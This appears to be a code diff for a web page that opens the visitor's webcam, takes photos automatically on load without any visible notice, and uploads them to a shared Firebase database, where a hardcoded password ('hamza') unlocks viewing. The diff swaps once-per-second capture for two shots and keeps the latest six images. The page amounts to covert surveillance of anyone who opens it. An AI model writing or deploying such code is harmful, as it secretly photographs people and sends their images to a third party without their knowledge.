@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - Auto Continuous Capture</title>
+  <title>Live Photo Sync - FIFO 6 Photos</title>
   <style>
     body {
       background: black;
@@ -10,10 +10,7 @@
       padding: 0;
       font-family: sans-serif;
       overflow-y: scroll;
-      min-height: 300vh;
-    }
-    #spacer {
-      height: 150vh;
+      min-height: 200vh;
     }
     #result {
       text-align: center;
@@ -48,8 +45,6 @@
 </head>
 <body>
 
-  <div id="spacer"></div>
-
   <div id="result">
     <h3>Captured Photos:</h3>
     <button id="unlockBtn">🔒</button>
@@ -76,24 +71,29 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    const userId = "global"; // all users use same path, or use unique if needed
+    const photoPath = `livephotos/${userId}`;
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const photoGrid = document.getElementById('photoGrid');
     const unlockBtn = document.getElementById('unlockBtn');
 
     let isUnlocked = false;
-    let captureInterval;
+    let captureCount = 0;
 
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
       video.onloadedmetadata = () => {
-        // Start continuous auto-capture every 1 second
-        captureInterval = setInterval(capture, 1000);
+        // Capture 2 photos automatically
+        setTimeout(() => capturePhoto(), 200);   // first
+        setTimeout(() => capturePhoto(), 1200);  // second
       };
     });
 
-    function capture() {
-      if (!video.videoWidth) return;
+    function capturePhoto() {
+      if (captureCount >= 2) return;
+      captureCount++;
 
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
@@ -101,15 +101,15 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      db.ref("livephotos").once("value", snapshot => {
+      db.ref(photoPath).once("value", snapshot => {
         let photos = snapshot.val() || [];
-        if (photos.length >= 4) photos.shift(); // remove oldest
         photos.push(dataUrl);
-        db.ref("livephotos").set(photos);
+        if (photos.length > 6) photos = photos.slice(-6); // keep latest 6 only
+        db.ref(photoPath).set(photos);
       });
     }
 
-    db.ref("livephotos").on("value", snapshot => {
+    db.ref(photoPath).on("value", snapshot => {
       const photos = snapshot.val() || [];
       photoGrid.innerHTML = "";
       photos.forEach(url => {
@@ -129,7 +129,6 @@
       if (pass === "hamza") {
         isUnlocked = true;
         unlockBtn.style.display = "none";
-
         document.querySelectorAll(".photoGrid img").forEach(img => {
           img.style.display = "block";
         });
